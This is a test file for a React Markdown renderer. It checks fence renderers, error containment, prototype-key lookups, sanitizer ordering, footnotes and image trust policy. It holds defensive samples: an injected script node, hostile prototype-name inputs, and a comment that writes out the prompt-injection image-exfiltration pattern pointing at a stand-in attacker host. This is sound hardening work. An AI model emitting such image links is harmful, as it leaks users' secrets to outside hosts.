/**
 * Markdown — the fence-renderer registry, the sanitize pass's composition + POSITION, and the
 * lazy `remend` contract (docs/CONTENT-SPEC.md §2/§6).
 *
 * Every case renders through the real lazy chain (react-markdown + remark-gfm + rehype-sanitize
 * are all installed here as devDependencies), so `findBy*` — not `getBy*` — is the entry point:
 * the first paint is the `Suspense` plain-text fallback.
 *
 * `composeRehypePlugins` is imported directly from `./markdown` (it is deliberately NOT re-exported
 * by `./index.ts`) — same not-public-surface test idiom as `messageBlockRenderCounter`.
 */
import { MantineProvider } from '@mantine/core'
import { render, screen, waitFor } from '@testing-library/react'
import { describe, expect, test } from 'bun:test'
import type { Element, Root } from 'hast'
import { composeRehypePlugins, Markdown, settledOnly } from './markdown'
import type { MarkdownContentTrust } from './markdown'

function renderMarkdown(ui: React.ReactElement) {
  return render(<MantineProvider>{ui}</MantineProvider>)
}

const VEGA_FENCE = '```vega\nspec body\n```'
/** The fence lands in a SETTLED block: the paragraph after the blank line becomes the tail. */
const VEGA_FENCE_THEN_TAIL = `${VEGA_FENCE}\n\ntrailing paragraph\n`

function vegaRenderers(testId: string) {
  return {
    vega: settledOnly(({ code }: { code: string }) => <div data-testid={testId}>{code}</div>),
  }
}

describe('fence-renderer registry', () => {
  test('a consumer renderer claims its language once settled', async () => {
    renderMarkdown(<Markdown fenceRenderers={vegaRenderers('vega')}>{VEGA_FENCE}</Markdown>)

    const custom = await screen.findByTestId('vega')
    expect(custom.textContent).toContain('spec body')
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  test('settledOnly renders the plain CodeBlock while the fence is the unsettled tail', async () => {
    renderMarkdown(
      <Markdown streaming fenceRenderers={vegaRenderers('vega')}>
        {VEGA_FENCE}
      </Markdown>,
    )

    // The fence is the only block, so it is the in-flight tail — unsettled.
    const code = await screen.findByText('spec body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.queryByTestId('vega')).toBeNull()
    // The unsettled half of the OTHER thing `settled` gates: no copy action on a streaming block.
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  test('a block that has settled keeps its custom renderer as the stream grows', async () => {
    const { rerender } = renderMarkdown(
      <Markdown streaming fenceRenderers={vegaRenderers('vega')}>
        {VEGA_FENCE_THEN_TAIL}
      </Markdown>,
    )

    await screen.findByTestId('vega')

    // Monotonicity: more text arrives, the tail moves further away — the settled fence must not
    // fall back to a CodeBlock.
    rerender(
      <MantineProvider>
        <Markdown streaming fenceRenderers={vegaRenderers('vega')}>
          {`${VEGA_FENCE_THEN_TAIL}and more\n`}
        </Markdown>
      </MantineProvider>,
    )

    expect(await screen.findByTestId('vega')).toBeDefined()
  })

  test('a consumer entry overrides the built-in for the same language key', async () => {
    renderMarkdown(
      <Markdown
        fenceRenderers={{ mermaid: ({ code }) => <div data-testid="own-mermaid">{code}</div> }}
      >
        {'```mermaid\ngraph TD\n  A --> B\n```'}
      </Markdown>,
    )

    const own = await screen.findByTestId('own-mermaid')
    expect(own.textContent).toContain('graph TD')
    expect(screen.queryByRole('img')).toBeNull()
  })

  test('the raw fence meta and its parsed title both reach the renderer', async () => {
    renderMarkdown(
      <Markdown
        fenceRenderers={{
          vega: ({ meta, title }) => <div data-testid="meta">{`${meta}|${title}`}</div>,
        }}
      >
        {'```vega title="chart.json"\nspec body\n```'}
      </Markdown>,
    )

    const probe = await screen.findByTestId('meta')
    expect(probe.textContent).toBe('title="chart.json"|chart.json')
  })

  test('an unclaimed language still falls through to CodeBlock', async () => {
    renderMarkdown(<Markdown>{'```notalanguage\nplain body\n```'}</Markdown>)

    const code = await screen.findByText('plain body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })
})

/**
 * A model-authored fence body (JSON for a `vega-lite` renderer, a payload for a `card` renderer) is
 * routinely malformed — neither declining nor throwing may take the message down, and `CodeBlock` is
 * the always-correct fallback both degrade to. Decline convention: `undefined` declines, `null` is a
 * DIFFERENT deliberate "render nothing" result and is used as-is (`./fence-block`'s `FenceRenderer`
 * doc). A throw is contained two different ways depending on where it happens — see the two
 * `Bomb`-shaped tests below, which is exactly the distinction the module comments draw.
 */
describe('fence renderer decline & throw containment', () => {
  test('a renderer that declines (returns undefined) falls back to CodeBlock', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={{ decline: () => undefined }}>
        {'```decline\nplain body\n```'}
      </Markdown>,
    )

    const code = await screen.findByText('plain body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })

  test('a renderer returning null is NOT a decline — it renders nothing, no CodeBlock fallback', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={{ blank: () => null }}>
        {'```blank\nnever shown\n```\n\nafter the fence'}
      </Markdown>,
    )

    // Waits for the real pipeline (the Suspense fallback holds the whole raw text as one node, so
    // this text only appears once react-markdown has actually rendered the document).
    await screen.findByText('after the fence')
    expect(screen.queryByText('never shown')).toBeNull()
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  test('a renderer that throws SYNCHRONOUSLY inside its own body falls back to CodeBlock', async () => {
    renderMarkdown(
      <Markdown
        fenceRenderers={{
          boom: () => {
            throw new Error('renderer blew up before returning anything')
          },
        }}
      >
        {'```boom\nraw body\n```'}
      </Markdown>,
    )

    // Proves containment, not just non-crash: the SAME assertions the plain-CodeBlock tests above
    // make. If this had propagated, `renderMarkdown` itself would have thrown synchronously.
    const code = await screen.findByText('raw body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })

  // A component the renderer RETURNS as a descriptor — `<Bomb />` is not invoked by calling the
  // renderer function; React invokes it later, during ITS OWN render pass. A try/catch around the
  // renderer call cannot reach a throw from here — only an error boundary can.
  function Bomb(): never {
    throw new Error('component blew up during its own render')
  }

  test('a renderer that returns a component which throws during ITS OWN render also falls back', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={{ boom: () => <Bomb /> }}>{'```boom\nraw body\n```'}</Markdown>,
    )

    const code = await screen.findByText('raw body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })

  test('settledOnly propagates a decline through to the default once settled', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={{ decline: settledOnly(() => undefined) }}>
        {'```decline\nplain body\n```'}
      </Markdown>,
    )

    const code = await screen.findByText('plain body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })

  test('settledOnly contains a throw from the wrapped renderer once settled', async () => {
    renderMarkdown(
      <Markdown
        fenceRenderers={{
          boom: settledOnly(() => {
            throw new Error('settled renderer blew up')
          }),
        }}
      >
        {'```boom\nraw body\n```'}
      </Markdown>,
    )

    const code = await screen.findByText('raw body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })

  test('a renderer returning a valid node still wins normally, decline/throw handling notwithstanding', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={{ vega: ({ code }) => <div data-testid="vega">{code}</div> }}>
        {'```vega\nspec body\n```'}
      </Markdown>,
    )

    const custom = await screen.findByTestId('vega')
    expect(custom.textContent).toContain('spec body')
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  /**
   * "Once, not per render": the per-fence `warned` gate lives on a `useRef` inside `FenceBlock`
   * (`./fence-block`'s `WarnedGate`), so it survives ordinary re-renders of the SAME fence position —
   * both `fenceRenderers` and `children` are held referentially stable across the `rerender()` call
   * below on purpose, so react-markdown's `pre` mapping keeps the same component identity across the
   * two render passes instead of remounting (a fresh object literal per render would defeat that).
   *
   * NOT covered here, and disclosed rather than silently assumed: a renderer applied directly to a
   * still-STREAMING tail (no `settledOnly`) is re-rendered from a freshly recreated `FenceBlock`
   * instance on every token — `markdown.tsx`'s `BlockRenderer` intentionally rebuilds its
   * `SlugTracker`/`components` map whenever the block's `text` changes, which is every token for the
   * growing tail — so a fence that stays malformed while still streaming legitimately re-warns per
   * token rather than staying silent. That is a real, disclosed limitation of the per-instance gate,
   * not a claim this test makes.
   */
  test('the dev warning for a throwing renderer fires once per fence, not once per render', async () => {
    const warnings: unknown[][] = []
    const original = console.warn
    console.warn = (...args: unknown[]) => void warnings.push(args)

    const stableRenderers = {
      boom: () => {
        throw new Error('renderer blew up')
      },
    }
    const stableChildren = '```boom\nraw body\n```'

    try {
      const { rerender } = renderMarkdown(
        <Markdown fenceRenderers={stableRenderers}>{stableChildren}</Markdown>,
      )
      await screen.findByText('raw body')
      expect(warnings).toHaveLength(1)
      expect(String(warnings[0]?.[0])).toContain('[basalt] FenceBlock')

      rerender(
        <MantineProvider>
          <Markdown fenceRenderers={stableRenderers}>{stableChildren}</Markdown>
        </MantineProvider>,
      )
      await screen.findByText('raw body')
      expect(warnings).toHaveLength(1)
    } finally {
      console.warn = original
    }
  })
})

/**
 * The fence info string is MODEL-CONTROLLED — `markdown-hast` reads the language off the
 * `language-*` class, and `defaultSchema.attributes.code` (`[['className', /^language-./]]`) waves
 * any such class through the sanitize pass. Both registries are plain object literals, so an
 * unguarded `map[language]` resolved `Object.prototype` members: ` ```valueOf `, ` ```hasOwnProperty `
 * and ` ```isPrototypeOf ` THREW when called unbound, ` ```__proto__ ` threw on a non-callable, and
 * ` ```toString `/` ```constructor ` rendered garbage in place of the code.
 */
describe('fence registry — a prototype member never resolves as a renderer', () => {
  const HOSTILE_LANGUAGES = [
    'valueOf',
    'toString',
    'constructor',
    '__proto__',
    'hasOwnProperty',
    'isPrototypeOf',
  ] as const

  for (const language of HOSTILE_LANGUAGES) {
    test(`\`\`\`${language} falls through to CodeBlock instead of Object.prototype.${language}`, async () => {
      renderMarkdown(<Markdown>{`\`\`\`${language}\nhostile body\n\`\`\``}</Markdown>)

      // The Suspense fallback holds the WHOLE raw fence as one text node, so an exact-string
      // `findByText` only matches once the real pipeline has rendered the fence.
      const code = await screen.findByText('hostile body')
      expect(code.closest('pre')).not.toBeNull()
    })
  }

  test('a consumer registry is indexed by own keys only, same as the built-ins', async () => {
    renderMarkdown(
      <Markdown fenceRenderers={vegaRenderers('vega')}>
        {'```toString\nhostile body\n```'}
      </Markdown>,
    )

    const code = await screen.findByText('hostile body')
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.queryByTestId('vega')).toBeNull()
  })
})

// ── Sanitize ──────────────────────────────────────────────────────────────────────────────────

/**
 * A rehype plugin that injects two elements neither `defaultSchema` nor basalt allows: `xUnsafe`
 * (unsafe → unwrapped to its text) and `script` (in `defaultSchema.strip` → dropped whole).
 *
 * react-markdown does not parse raw HTML, so a `<script>` written in the markdown SOURCE never
 * becomes an element in the first place — injecting through a plugin is the only way to put an
 * unsafe node into the tree, and it is also exactly the threat model the sanitize pass exists for.
 */
function injectUnsafeElements() {
  return (tree: Root): undefined => {
    const xUnsafe: Element = {
      type: 'element',
      tagName: 'x-unsafe',
      properties: {},
      children: [{ type: 'text', value: 'UNWRAPPED' }],
    }
    const script: Element = {
      type: 'element',
      tagName: 'script',
      properties: {},
      children: [{ type: 'text', value: 'PWNED' }],
    }
    tree.children.push(xUnsafe, script)
    return undefined
  }
}

describe('sanitize pass', () => {
  test('runs AFTER a consumer rehypePlugin — nothing it injects survives', async () => {
    const { container } = renderMarkdown(
      <Markdown rehypePlugins={[injectUnsafeElements]}>paragraph</Markdown>,
    )

    await screen.findByText('paragraph')
    // `xUnsafe` is not in defaultSchema.tagNames — the element goes, its text is unwrapped.
    expect(container.querySelector('x-unsafe')).toBeNull()
    expect(container.textContent).toContain('UNWRAPPED')
    // `script` is in defaultSchema.strip — element AND contents dropped. Were the sanitize pass
    // registered BEFORE the consumer plugin, both of these would have survived untouched.
    expect(container.querySelector('script')).toBeNull()
    expect(container.textContent).not.toContain('PWNED')
  })

  test('sanitizeSchema additions reach the pipeline without destroying the defaults', async () => {
    const { container } = renderMarkdown(
      <Markdown rehypePlugins={[injectUnsafeElements]} sanitizeSchema={{ tagNames: ['x-unsafe'] }}>
        paragraph
      </Markdown>,
    )

    await screen.findByText('paragraph')
    // The addition took effect...
    expect(container.querySelector('x-unsafe')).not.toBeNull()
    // ...and `defaultSchema.strip` survived the merge. A shallow top-level spread (what
    // hast-util-sanitize does with a raw schema) would have wiped `strip` and let this through.
    expect(container.textContent).not.toContain('PWNED')
  })
})

/**
 * The always-on sanitize pass must not break GFM footnotes. TWO layers prefix ids and only one of
 * them touches `href`: `mdast-util-to-hast` namespaces both sides with `'user-content-'`, then
 * `hast-util-sanitize` prefixes again — but `href` is not in `defaultSchema.clobber`, so
 * `id="user-content-user-content-fn-1"` ended up next to `href="#user-content-fn-1"` and every
 * footnote link dangled. `markdown.tsx`'s `FOOTNOTE_CLOBBER_FIX` turns the sanitizer's layer off
 * and leaves the to-hast one, which covers id and href alike.
 */
describe('GFM footnotes survive the sanitize pass', () => {
  const FOOTNOTE_DOC = 'A claim.[^1] And another.[^note]\n\n[^1]: The evidence.\n\n[^note]: More.\n'

  test('every in-document link resolves to an element that is actually rendered', async () => {
    const { container } = renderMarkdown(<Markdown>{FOOTNOTE_DOC}</Markdown>)

    // The Suspense fallback is a plain text span with no links, so this waits for the real render.
    const links = await screen.findAllByRole('link')
    const hashHrefs = links
      .map((link) => link.getAttribute('href') ?? '')
      .filter((href) => href.startsWith('#'))

    // Two refs + two back-refs.
    expect(hashHrefs.length).toBe(4)
    for (const href of hashHrefs) {
      expect(container.querySelector(`[id="${href.slice(1)}"]`)).not.toBeNull()
    }
  })

  test('a footnote ref keeps the id its own back-link points at', async () => {
    const { container } = renderMarkdown(<Markdown>{FOOTNOTE_DOC}</Markdown>)

    await screen.findAllByRole('link')
    // The OTHER half of the round trip, and a separate bug from the double-prefix: `LinkRenderer`
    // used to rebuild the anchor from `href` alone, discarding the `id` that the back-link in the
    // footnote body targets.
    expect(container.querySelector('a[id="user-content-fnref-1"]')).not.toBeNull()
    expect(container.querySelector('a[id="user-content-fnref-note"]')).not.toBeNull()
  })
})

/**
 * `contentTrust` — NOT `streaming` — selects the image allowlist. Auto-fetched images are the
 * classic prompt-injection exfiltration channel (`![](https://attacker/?q=<secrets>)`), and a
 * finished agent message is settled but still model-generated: keying the policy off "is this run
 * in flight" reopened the channel for every completed message.
 */
describe('image trust policy', () => {
  const IMAGE_DOC = '![local](/assets/local.png)\n\n![probe](https://cdn.example/pixel.png?q=leak)'

  async function renderImages(ui: React.ReactElement) {
    const { container } = renderMarkdown(ui)
    // `findByAltText` only ever matches an <img>, so the Suspense text fallback cannot satisfy it.
    await screen.findByAltText('local')
    return container
  }

  test('trusted content (the default) keeps the open https allowlist', async () => {
    const container = await renderImages(<Markdown>{IMAGE_DOC}</Markdown>)

    expect(screen.getByAltText('probe').getAttribute('src')).toBe(
      'https://cdn.example/pixel.png?q=leak',
    )
    expect(container.innerHTML).toContain('cdn.example')
  })

  test('untrusted content blocks an off-origin image even though it is SETTLED', async () => {
    const container = await renderImages(<Markdown contentTrust="untrusted">{IMAGE_DOC}</Markdown>)

    // Same-origin still renders — this is an allowlist, not a blanket image kill.
    expect(screen.getByAltText('local').getAttribute('src')).toBe('/assets/local.png')
    // The off-origin one is dropped whole: no <img>, and the URL never reaches the DOM.
    expect(screen.queryByAltText('probe')).toBeNull()
    expect(container.querySelector('img[src^="https://"]')).toBeNull()
    expect(container.innerHTML).not.toContain('cdn.example')
  })

  test('streaming alone still defaults to untrusted (the pre-1.12 fail-safe)', async () => {
    const container = await renderImages(<Markdown streaming>{IMAGE_DOC}</Markdown>)

    expect(container.innerHTML).not.toContain('cdn.example')
  })

  test('an explicit allowedImagePrefixes opts an origin back in over the untrusted default', async () => {
    const container = await renderImages(
      <Markdown contentTrust="untrusted" allowedImagePrefixes={['https://cdn.example/', '/']}>
        {IMAGE_DOC}
      </Markdown>,
    )

    expect(container.innerHTML).toContain('cdn.example')
  })

  /**
   * `contentTrust` is typed `MarkdownContentTrust`, but that is compile-time only — a plain-JS
   * consumer or an `as unknown as MarkdownContentTrust` cast (used below, same idiom as
   * `tool-chip.test.tsx`'s hostile-input casts) can hand this ANY string. `IMAGE_PREFIXES_BY_TRUST`
   * is a plain object literal, so an unguarded lookup resolves `Object.prototype` members for a key
   * like `'constructor'`/`'toString'`, or `undefined` for a plain unrecognised key.
   *
   * EXECUTED against the pre-fix code, NEITHER case "fails closed" on its own: `undefined` and a
   * `Function.prototype` member both reach `createUrlTransform`'s `isAllowedUrl`, which
   * unconditionally calls `prefixes.some(...)` — that CRASHES the render with an uncaught
   * `TypeError` the instant an `<img>` is transformed (nothing between `Markdown` and
   * react-markdown's `img` visit catches it), rather than degrading to plain text with the image
   * dropped. Same defect shape, same fix, as the fence registry's `lookupFenceRenderer`
   * (`./fence-block`) — restrict the lookup to OWN keys and fail closed to the MOST RESTRICTIVE
   * policy for anything else, proven here by the render completing (not crashing) AND still
   * blocking the off-origin image.
   */
  describe('an unrecognised or prototype-key contentTrust fails closed, not open or crashed', () => {
    const HOSTILE_CONTENT_TRUST_VALUES = [
      'nonsense',
      'toString',
      'constructor',
      '__proto__',
    ] as const

    for (const hostile of HOSTILE_CONTENT_TRUST_VALUES) {
      test(`contentTrust="${hostile}"`, async () => {
        const container = await renderImages(
          <Markdown contentTrust={hostile as unknown as MarkdownContentTrust}>
            {IMAGE_DOC}
          </Markdown>,
        )

        // Same-origin still renders — the restrictive policy is an allowlist, not a blanket kill.
        expect(screen.getByAltText('local').getAttribute('src')).toBe('/assets/local.png')
        // The off-origin image is dropped whole, exactly like the explicit 'untrusted' case above.
        expect(screen.queryByAltText('probe')).toBeNull()
        expect(container.querySelector('img[src^="https://"]')).toBeNull()
        expect(container.innerHTML).not.toContain('cdn.example')
      })
    }
  })
})

describe('composeRehypePlugins', () => {
  const FAKE_PLUGIN = () => undefined
  const sanitizer = {
    plugin: FAKE_PLUGIN,
    baseSchema: { tagNames: ['p'], strip: ['script'] },
  }

  test('appends [plugin, schema] LAST, after every consumer plugin', () => {
    const first = () => undefined
    const second = () => undefined

    const composed = composeRehypePlugins({
      sanitizer,
      consumerPlugins: [first, second],
      sanitizeSchema: { tagNames: ['x-unsafe'] },
    })

    expect(composed.length).toBe(3)
    expect(composed[0]).toBe(first)
    expect(composed[1]).toBe(second)

    const tail = composed[2] as [unknown, { tagNames: string[]; strip: string[] }]
    expect(tail[0]).toBe(FAKE_PLUGIN)
    expect(tail[1].tagNames).toContain('p')
    expect(tail[1].tagNames).toContain('x-unsafe')
    expect(tail[1].strip).toContain('script')
  })

  test('an absent rehype-sanitize peer leaves the consumer list untouched', () => {
    const only = () => undefined
    expect(composeRehypePlugins({ sanitizer: null, consumerPlugins: [only] })).toEqual([only])
    expect(composeRehypePlugins({ sanitizer: null })).toEqual([])
  })

  test('the composed schema leaves id-namespacing to mdast-util-to-hast', () => {
    // The pipeline-level half of the footnote fix, pinned at the unit level. `mergeSanitizeSchema`
    // deliberately IGNORES an empty `clobberPrefix` coming from a consumer extension (that is the
    // additions-only channel refusing to let outside code disable a protection), so the decision
    // is made past the merge — and a consumer cannot re-enable double-prefixing by accident.
    const composed = composeRehypePlugins({
      sanitizer,
      sanitizeSchema: { clobberPrefix: 'user-content-' },
    })
    const tail = composed[0] as [unknown, { clobberPrefix: string }]
    expect(tail[1].clobberPrefix).toBe('')
  })
})

// ── remend ────────────────────────────────────────────────────────────────────────────────────

describe('lazy remend', () => {
  test('the streaming tail is repaired once the peer resolves', async () => {
    const { container } = renderMarkdown(<Markdown streaming>{'a **bold'}</Markdown>)

    // NOT `findByText(/bold/)`: the Suspense fallback renders the full raw text, so that matches on
    // the FIRST paint and the assertion below then only passes when an earlier test in the file
    // happened to warm the `resolvedRemend` singleton first. Waiting on `<strong>` waits for the
    // thing under test — remend closing the dangling `**` — and holds in isolation.
    await waitFor(() => {
      expect(container.querySelector('strong')).not.toBeNull()
    })
    expect(container.textContent).toContain('bold')
    // remend removed the markers rather than leaving them as literal text.
    expect(container.textContent).not.toContain('**')
  })

  test('the streaming tail always shows its text — through BOTH repair states, never blank', async () => {
    // The `repair === null` branch (`StreamingTailBlock`, the state a permanently-absent peer stays
    // in forever) CANNOT be isolated in this process: `remend` is installed here, `resolvedRemend`
    // is a module-level singleton any earlier streaming test warms, and a `mock.module` would
    // poison it for every later test. So this asserts the invariant that actually holds in both
    // states — the tail renders its text, in one spelling or the other, and never throws or blanks
    // — first synchronously on the initial paint, then again after the pipeline has settled.
    // It deliberately claims no more than that; the repair itself is the test above.
    const { container } = renderMarkdown(<Markdown streaming>{'a **bold'}</Markdown>)

    expect(container.textContent).toMatch(/a \*{0,2}bold/)

    // Settle on `<p>` — react-markdown's own output — NOT on `<strong>`: waiting for the repair
    // would make this a duplicate of the test above rather than an independent invariant. The
    // Suspense fallback is a bare `<span>`, so this still waits for the real pipeline.
    await waitFor(() => {
      expect(container.querySelector('p')).not.toBeNull()
    })
    expect(container.textContent).toMatch(/a \*{0,2}bold/)
  })
})
